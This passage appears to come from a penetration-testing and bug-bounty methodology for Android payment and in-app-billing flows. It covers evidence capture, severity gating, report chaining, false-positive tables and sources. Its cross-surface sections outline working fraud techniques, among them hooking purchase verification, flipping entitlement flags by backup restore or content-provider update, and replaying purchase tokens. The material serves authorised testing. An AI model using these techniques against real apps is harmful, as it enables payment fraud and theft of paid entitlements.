   system owner can authorise access to it.
2. NEVER authenticate to a third party's production infrastructure with a credential recovered from the
   client beyond one read-only call (D23-038), and never mutate merchant state.
```
  Where a test is blocked, record it rather than skipping it:
```
id   surface           blocker                    needed_from  requested   due    status   coverage_impact
B-03 D23 payments      PSP sandbox keys           client       2026-09-03  09-05  REFUSED  payment flows code-review only
```
- **Proof:** The signed scope sheet, and a BLOCKED register in the report. An OPEN or REFUSED row at
  delivery becomes a **named coverage limitation**, cross-referenced from the ruled-out table as *not
  established* — never as *clean*.
- **Escalation:** Where testing is blocked, route the impact question to the vendor as three questions
  they can answer from their own logs (see D23-039). That is stronger than a test result, because it
  cannot be dismissed as unauthorised probing.
- **Ruled out when:** Never. The absence of this artefact is itself the finding against the engagement:
  "we found nothing in payments" without it is false assurance and a liability.

### D23-064 · Evidence discipline for money findings

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter with a state change |
| **Maps to** | MASTG-TECH-0009 (system log inspection); the evidence-hygiene corpus (five-screenshot state-change pattern, HAR sanitising, PII split) |

- **Test:** A money finding needs pre-state, the bug, post-state and the out-of-band side effect. Triagers
  rate what they can see, and a payment report that shows only HTTP gets downgraded.
- **How:** Five artefacts, taken in one sitting without reloading pages between them (reloads regenerate
  cookies and invalidate earlier captures):
```
1. Pre-state    — balance / entitlement / order status BEFORE, read from the server
2. The bug      — the request that should have been refused, with its response
3. Post-state negative — the control: the same call under an untampered account still refused
4. Post-state positive — the balance / entitlement / order AFTER, read from the server
5. Side effect  — the PSP dashboard, the notification (or its absence), the ledger entry
Filenames: {finding-#}-step{n}-{description}.png  e.g. 07-step2-redeem-token-second-account.png
```
```bash
adb shell screenrecord --time-limit 60 /sdcard/poc.mp4 && adb pull /sdcard/poc.mp4
adb exec-out screencap -p > shot.png
adb logcat -c   # at the start; adb logcat -d > logcat.txt at the end
# sanitise the HAR, then VERIFY the sanitisation
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -i 'authorization\|"cookie"' out.sanitized.har | head -20
```
  Mask: session tokens, `purchaseToken` beyond the first/last six characters, the full PAN, the PSP secret
  key. **Leave visible:** trace ids (`x-request-id`, `x-datadog-trace-id`), your own attacker account's
  user id, order ids, JSON key names, and the amounts — the triager needs those to find the transaction in
  their own logs. Rotate the test account's session and password after submission so anything visible in a
  screenshot is dead.
- **Proof:** The artefact set itself, cross-referenced by filename from the report body.
- **Escalation:** A 60-second video converts a disputed money report into an accepted one more often than
  any amount of prose.
- **Ruled out when:** Never — this item gates submission, not discovery.

### D23-065 · The pre-severity gate, applied to the Critical claim rather than to the bug

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (it governs every Critical/High in this chapter) |
| **Attacker** | n/a |
| **Applies to** | every payment finding you are about to call Critical |
| **Maps to** | the pre-severity gate and retraction discipline in the triage-validation corpus; Bugcrowd VRT README — "Varies" is not a licence to guess, a `null`-priority path is filed with your CVSS vector and your impact proof |

- **Test:** Write the draft Critical title, then substitute **the Critical claim** for "the bug" in each
  question. Payments reports fail this gate more than any other class, because a confirmed primitive in
  the middle of a money flow feels like the whole flow.
- **How:**
```
1. Have I validated the FULL chain to attacker-attainable impact, or only one primitive?
   "The cart accepted a negative price" is a primitive. "The wallet balance is now withdrawable" is a chain.
2. What does the attacker walk away with, in one concrete sentence?
   "£X of goods per execution, unbounded" — not "could lead to financial loss".
3. Have I reproduced the full chain end to end at least TWICE? (discovery + PoC, not "I'm sure it works")
4. Is there a gate still standing? A capture-time recompute, a 100% discount cap, a settlement-side
   rejection, a reconciliation job. If yes it is not Critical — file it as "primitive present" at lower
   severity and say which gate holds.
5. Has the programme rejected this severity class before? (IAP bypass is excluded by name on many.)
```
  Then the writing rule: **never write "could potentially", "could be used to" or "may allow".** Either
  demonstrate the chain or downgrade the claim to what you demonstrated. Never split the difference.
- **Proof:** A documented pass/kill decision per finding, and — where a claim fails reproduction — a
  retraction appendix entry (original signal / disproving evidence / why it looked like a bug /
  retraction date). A clean 11-finding report with a retraction appendix is more trustworthy than a
  13-finding report where two fall apart at triage.
- **Escalation:** The inverse rule matters here more than anywhere: **do not retract a confirmed finding
  that stopped reproducing because the client patched mid-engagement.** Keep the timestamped pre-patch
  request and response; the patch is evidence the finding was real, and the detection timeline is itself a
  deliverable in red-team mode.
- **Ruled out when:** Never — this item gates severity, not existence.

### D23-066 · Chain-filing order for a payment chain

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every multi-finding payment engagement — which is most of them, because these bugs come in chains |
| **Maps to** | the submission-order strategy in the reporting corpus; Bugcrowd's "one fix = one bounty" convention |

- **Test:** A consumer report references the primitives' ids, which only exist once the primitives are
  filed. Filing the chain as one report merges two payouts into one.
- **How:**
```
1. Identify the highest-severity chained outcome  (e.g. free entitlement at scale, or funds moved).
2. File each PRIMITIVE separately at its standalone severity, leaving a placeholder cross-reference:
     - obfuscatedAccountId never set                      (D23-008)
     - purchaseToken not checked for uniqueness           (D23-007)
     - entitlement flag accepted from the client          (D23-005)
3. File the CONSUMER with the full narrative at the chained severity, filling in the real primitive ids.
4. Edit each primitive to backfill the consumer's id.
```
```markdown
## Chain partners (filed as separate reports)
- **submission [UUID-1]** — purchaseToken uniqueness not enforced
- **submission [UUID-2]** — obfuscatedAccountId not set at the purchase call site
These primitives have independent fix surfaces and are filed separately per the programme's
"one fix = one bounty" rule.
```
  Do not paste the chain narrative into every primitive, do not claim each primitive is independently P1,
  and do not ask for one combined bounty — a chain is a **severity amplifier**, not a merge request. File
  primitives -> consumer -> clean standalone mediums -> anything scope-risky last, and never all within
  minutes of each other.
- **Proof:** Cross-referenced ids in both directions.
- **Escalation:** Where the VRT node you pick defaults lower than the demonstrated impact, open the body
  with the severity-request paragraph — name the chosen node, name its default priority, state the
  priority you are requesting and give three impact axes (the settled amount per execution, the
  repeatability, and the programme's own stated focus areas). The escalation is not automatic; you have to
  ask, with grounded reasoning, in the first body section.
- **Ruled out when:** Never — this item gates filing, not discovery.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| Premium unlocked on your own rooted device and it reverts on the next sync | AM-12 is not an attacker model; the server is the control and it held. Files as `lack_of_binary_hardening\|runtime_instrumentation_based` (**P5**) | A premium-only **server** response under a free account's token, from `curl`, outside the app (D23-005) |
| `BASE64_PUBLIC_KEY` / `base64EncodedPublicKey` found in the decompile | A Play licensing public key is meant to be in the APK; its presence alone proves nothing about where verification happens | The same key used by an in-app `Signature.verify` **and** no `purchaseToken` leaving the device (D23-002) |
| `verifyPurchase()` hooked with Frida and it returned `true` | A hook on your own process is the expected outcome of an untrusted execution environment | The entitlement persisting after a clean install and login on a second device (D23-005, D23-012) |
| Negative price or quantity accepted by the cart endpoint | The explicit FP trap: cart APIs accept arbitrary client state while capture rejects negative totals. The cart display is fiction | The credit **settling** — wallet balance, store credit, or a refund to your instrument (D23-022) |
| The cart shows `-$50.00` after stacking five coupons | Most systems silently cap the applied discount at 100%; the captured payment is `$0.00` and no refund issues | The captured payment, or a refund, reflecting the stacked discount (D23-043) |
| 100 GraphQL aliases of `redeemCoupon` all returned `success:true` | Apollo/GraphQL-Ruby/Graphene resolve aliases sequentially inside one request; the response is not the state | A ledger read showing 100 applications — and then it is a quota bug, not a race (D23-050) |
| 30 parallel requests all returned 200 | N×200 is not a ledger effect, and races reproduce 1/10 or 2/100 | The balance/ledger arithmetic before, after the sequential baseline, and after the parallel run (D23-045) |
| `400 "purchaseToken is required"` on an unauthenticated billing call | A body parser or schema filter in front of the auth middleware produces exactly this | A minimal well-formed `{}` still returning the domain-field error rather than a 401 (D23-057) |
| An older `/api/v1/` billing path is still live | A version difference alone is Informational | A behavioural regression on the old path — weaker auth, no 429, laxer validation, more fields (D23-056) |
| `rzp_test_…`, `pk_test_…` or a Stripe publishable key in the APK | Publishable and test identifiers are public by design; filing them lands on `...\|intentionally_public_sample_or_invalid` (**P5**) | A **secret** authenticating with one read-only call (D23-038), or a sandbox key live against production (D23-037) |
| `ENVIRONMENT_TEST` in a debug flavour | Debug flavours are not distributed | The same constant in the store-distributed release artefact (D23-036) |
| The payment confirmation screen can be tapjacked | `mobile_security_misconfiguration\|tapjacking` is **P5** and the overlay alone moves no money | A transaction completed end to end by overlay plus accessibility, recorded, with the server record (D23-034) |
| No certificate pinning on the payment host | `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` and `\|defeatable` are both **P5**, and AM-07 is tester convenience, not an attacker | Cleartext transmission of a token or PAN to a network attacker with no trusted CA (that is D14, not D23) |
| Card fields are screenshot-able / appear in the recents thumbnail | `insecure_data_storage\|screen_caching_enabled` is **P5** — Bugcrowd's own remediation text calls `FLAG_SECURE` a best practice | The PAN recoverable from a third party's session-replay dashboard, or from disk after dismissal (D23-058) |
| A promo code works more than once | Many marketing codes are multi-use by design | The code documented or labelled single-use, or a per-account limit that the parallel run overruns (D23-043) |
| `purchaseToken` visible in the proxy on your own device | It is your own purchase on your own device over your own proxy | The same token accepted under a second account (D23-007) |
| The Play Billing Library version is out of date | Version currency is not a vulnerability without a reachable defect | A reachable defect — e.g. the legacy implicit `InAppBillingService.BIND` path (D23-019) |
| "The app trusts the client for `isPremium`" with no server call shown | An architectural observation, not a demonstrated impact; triagers close these as theoretical | The gated server response, plus the untampered negative control (D23-005) |
| IAP bypass on a programme that excludes IAP bypass by name | Out of scope is out of scope; filing it damages the validity ratio | Nothing — unless the entitlement also gates **other users' data**, which re-files it as access control (D23-005) |

## Cross-surface joins

- **D11 backup/restore × D23 entitlement store.** Nobody reviews the backup agent and the entitlement
  read path together. If the entitlement key (or a `dynamic_api_hosts`-style config) is inside the backup
  set and trusted on read, the `star` / `abe.jar pack-kk` / `adb restore` pipeline flips it on a **stock,
  unrooted** device — which is the difference between a P5 "rooted device required" and a reportable
  finding. Applies to ≤ Android 11; `[DEGRADED]` on 12+. (D23-004)
- **D02 packaging/multi-user × D23 install-scoped entitlement.** The trial or referral bonus is keyed on
  a generated install UUID; the work profile, the OEM dual-app feature and Private Space (Android 15+)
  each mint a new one on the same physical device. Nobody tests entitlement uniqueness against the
  platform's own multi-instance features. (D23-014, D23-044)
- **D08 PendingIntent × D23 payment confirmation.** The `PendingIntent` review looks for mutability and
  redirection; the payments review looks at amounts. Neither notices that the "confirm payment"
  `PendingIntent` lacks `FLAG_ONE_SHOT` and carries a constant `requestCode`, so one confirmation replays
  N times and order A's confirmation lands on order B. (D23-041)
- **D10 WebView origin allow-list × D23 payment bridge.** The bridge audit rates methods by what they
  return; the payment audit assumes the bridge is internal. The join is a payment method whose origin
  guard covers the main frame only, reachable from a cross-origin iframe inside an allow-listed page —
  transaction parameters out, transactions in. (D23-040)
- **D13 event-bound biometrics × D23 transaction signing.** The auth review checks whether the biometric
  prompt can be hooked; the payments review checks whether the amount can be changed. The join is that a
  hooked approval produces an artefact which is then **replayable against a different transaction**,
  because nothing binds the approval to the parameters. Either surface alone is a Medium; together they
  are a P1. (D23-032, D23-033)
- **D24 push/FCM × D23 entitlement refresh.** Entitlement state is refreshed by a push-triggered
  broadcast. The push review looks for data leakage in the payload; the payments review never sees the
  push at all. If the receiver is exported (targetSdk < 31, or a runtime registration without
  `RECEIVER_NOT_EXPORTED` on Android 14+), the entitlement is assertable locally — and if the backend
  accepts the resulting state, remotely. (D23-017)
- **D20 session-replay SDK × D23 card entry.** The privacy review lists which SDKs receive PII; the
  payments review checks whether the PAN is stored locally. Neither notices that UXCam/Smartlook/
  Clarity/FullStory record the card screen unmasked, putting the PAN and CVV in a **third party's**
  dashboard in replayable form — a PCI exposure whose artefact is the vendor replay, not the device.
  (D23-058)
- **D18 SDK credentials × D23 merchant account.** The secrets sweep finds `sk_live_`/`key_secret` and
  rates it as a hardcoded credential; the payments review never reads the secrets list. The join is that
  the credential's capability is *refunds and customer PII on the merchant account* — the same string,
  two orders of magnitude of severity. (D23-038, D23-039)
- **D09 deep links × D23 payment callback.** The deep-link review enumerates schemes and checks for
  redirection; the payments review checks the PSP integration. The join is that the PSP return URI is a
  deep link, so a web page fires the "payment succeeded" callback and the order ships — an AM-02 finding
  that neither review reaches alone. (D23-028, D23-052)
- **D15 shadow API × D23 billing verify.** The API review version-diffs generic endpoints; the payments
  review tests only the version the app calls. The join is `/api/v1/billing/verify` still accepting a
  replayed `purchaseToken` that `/api/v3/` rejects, because the uniqueness check was never backported.
  (D23-056, D23-007)
- **D21 integrity/RASP × D23 licensing.** The resilience review reports "Play Integrity is bypassable" as
  a P5. The payments review reports "the entitlement is client-side" as a P5. The join — the integrity
  verdict is the *only* thing gating the entitlement, and it is evaluated on the client — is a single
  reportable defect. (D23-020)
- **D07 ContentProvider × D23 entitlement row.** The provider review tests for injection and file read;
  the payments review tests the API. Neither runs `content update --bind active:i:1` against the
  entitlements table from a zero-permission app. (D23-018)

## Sources

- **OWASP MASTG / MASVS** — MASTG-TEST-0338, -0368, -0327, -0340; MASTG-TECH-0008, -0009, -0010, -0011,
  -0043; MASTG-KNOW-0036; MASTG-BEST-0066; MASWE-0004, -0009, -0011, -0018, -0023, -0025, -0039, -0040,
  -0050, -0057, -0059; MASVS-AUTH-1, MASVS-RESILIENCE-2/-3, MASVS-PLATFORM. Includes the corpus's own
  documented gap: **there is no Android MASTG-TEST for purchase validation, subscription state or fraud.**
- **Bugcrowd VRT** (release 2026-07-08, 581 entries) — the exact node paths and priorities quoted
  throughout, including the absence of any billing node and the VRT README's "Varies" doctrine.
- **Google developer documentation** — Play Billing security ("Do not verify signatures on the device",
  `purchaseToken` uniqueness, `setObfuscatedAccountId()`, the three-day auto-refund, the Developer API
  methods `Purchases.products:get` / `Purchases.subscriptionsv2:get` / `:acknowledge` / `Orders:refund`
  with `revoke=true`, and the Voided Purchases API); Play Integrity verdicts
  (`accountDetails.appLicensingVerdict`); Android 14 `RECEIVER_EXPORTED`; Android 15 features (NFC Observe
  Mode, `processPollingFrames()`, polling-loop pattern filters, the Wallet role) and behaviour changes
  (edge-to-edge); Android 16 behaviour changes (predictive back); `risks/` pages for insecure broadcast
  receivers, pending intents, deep links, content resolvers, insecure machine-to-machine and
  access control to exported components; Google ASI campaign *Google Play Billing interception*
  (2016-07-28, `faqs/answer/7054270`).
- **AOSP** — security-model paper §4.3.8 on Protected Confirmation; Keystore tags
  `TAG_TRUSTED_CONFIRMATION_REQUIRED` / `TAG_TRUSTED_USER_PRESENCE_REQUIRED`; the binder thread pool as a
  source of genuine local concurrency.
- **MITRE ATT&CK Mobile** — T1641 / T1641.001, T1643, T1516 (with detection DET0612/AN1666), T1417.002,
  T1453, T1582, T1616, T1660.
- **Disclosed HackerOne reports** — #125707 (Uber promo enumeration, $3,000), #753280 / #757095 / #754044
  (Razer RedPacket, $1,000 / $1,000 / $500), #126784 (QR payment without confirmation), #1751333 and
  #1941767 (MetaMask confirmation attribution), #3648638 (Monero `tx_amount=(all)`), #307239 ($10,000
  double payout), #1295844 ($7,500 wallet balance generation), #1849626 ($5,000 repeatable fee discount),
  #759247 (gift cards redeemed multiple times), #394329 ($8,000 cross-user billing parameter tampering),
  #2110030 / #1438052 / #1520931 / #2078571 / #119657 (limit-bypass races), #175490 (Shopify — the server
  accepting client-claimed state), #486629 (repeatable entitlement unlock).
- **OWASP API Security Top 10 (2023)** — API3, API5, API6; **OWASP WSTG** — BUSL-02, -03, -05, -06;
  **OWASP Mobile Top 10 2024** — M3, M7.
- **PortSwigger** — *Smashing the state machine*: the single-packet attack, and the probe-then-prove
  methodology (predict collisions, synchronised batches against a sequential baseline, isolate to two
  requests, automate retries).
- **The bug-hunting corpus** — the layer-ordering trap, marker discipline, the body-diff rule, the
  statistical-sample rule, server-policy-vs-state, the pre-severity gate, retraction discipline and its
  mid-engagement-patch inverse, the five-screenshot state-change pattern, HAR sanitising and the PII split,
  chain-filing order, the shadow-API behavioural diff, and the business-logic pattern library (negative
  price carried to settlement, currency swap, cart TOCTOU, step-skip and state-machine reversal, webhook
  replay, coupon stacking, referral self-redemption, GraphQL alias batching as a false race).
- **Vendor and platform programme economics** — Grab, Reddit, Xiaomi and HackerOne Platform Standards on
  what financial-impact findings must demonstrate; Cobalt's Pentest Diaries on business logic over
  platform hardening in financial engagements.
- **Tooling corpus** — objection (`android hooking search` / `set return_value` / `watch`,
  `android heap search instances` / `print fields` / `execute`), Frida (`java.security.Signature`,
  `com.android.billingclient.api.Purchase`, `Java.choose`), frida-il2cpp-bridge, Turbo Intruder gates,
  drozer, `ffuf`, `abe.jar` / `star` for the modify-and-restore pipeline.
- **Public research** — the Razorpay key-exposure study (~13,000 apps analysed, ~250 using the Razorpay
  API, ~5% exposing both `key_id` and `key_secret`, sufficient for transaction access and refunds);
  Ostorlab's server-delegation classification for payment credentials; the EMV/HCE relay research
  summarised in the HackTricks NFC pages; Mobile Hacking Lab's wallet and boarding-pass labs.
